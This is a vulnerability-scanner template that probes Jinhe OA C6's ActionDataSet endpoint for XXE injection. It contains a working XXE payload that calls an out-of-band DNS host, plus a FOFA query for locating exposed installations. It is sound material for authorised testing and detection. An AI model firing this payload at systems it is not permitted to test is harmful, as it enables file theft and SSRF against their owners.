id: jinhe-oa-c6-actiondataset-xxe

info:
  name: 金和OA-C6系统ActionDataSet接口XXE漏洞
  author: avic123
  severity: critical
  verified: true
  description: |
    金和OA-C6系统接口ActionDataSet存在XXE漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患
    fofa：app="金和网络-金和OA"
  reference:
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA-C6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ActionDataSet%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md
  tags: jinhe,oa,xxe
  created: 2025/8/19

set:
  oob: oob()
  oobHTTP: oob.HTTP
  oobDNS: oob.DNS
  hostname: request.url.host
rules:
  r0:
    request:
      method: POST
      path: /jc6/servlet/ActionDataSet
      headers:
        Content-Type: application/xml
      body: |
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{oobDNS}}"> %remote;]>
    expression: response.status == 200 && oobCheck(oob, oob.ProtocolDNS, 3)

expression: r0()
